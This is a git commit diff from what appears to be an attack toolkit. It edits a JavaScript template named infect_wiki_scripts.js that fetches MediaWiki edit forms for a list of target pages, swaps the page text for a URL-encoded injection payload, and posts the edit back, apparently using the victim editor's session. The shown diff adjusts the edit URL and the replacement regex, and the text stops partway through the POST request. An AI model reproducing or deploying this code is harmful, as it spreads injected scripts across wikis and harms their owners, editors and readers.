9fb1ebd9d87f47ecbc1b259b6f51046897e7edd9
Fyodor Sizov <fedia.sizov@gmail.com>
2023-02-05 12:59:28 +0300

    renaming

--- src/sources/infect_wiki_scripts.js
+++ src/sources/infect_wiki_scripts.js
@@ -1,10 +1,10 @@
 target_pages="%%csv_target_pages%%".split(",");
 for (var i = 0; i < target_pages.length; i ++) {
-    $.get("%%mw_website_prefix%%" + target_pages[i] + "?action=edit", function (data) {
+    $.get("%%mw_website_prefix%%index.php?title=" + target_pages[i] + "&action=edit", function (data) {
         edf = $(data).find("form#editform");
         edf_ser = edf.serialize();
         if (!edf_ser.match("%%negative_pattern%%")) {
-            edf_ser = edf_ser.replace(/(wpTextbox1=)(?:[^&]*)/g, "$1$2" + "%%urlenc_injection%%");
+            edf_ser = edf_ser.replace(/(wpTextbox1=)(?:[^&]*)/g, "$1" + "%%urlenc_injection%%");
             $.ajax({
                 type : "POST",
                 url : edf.attr("action"),
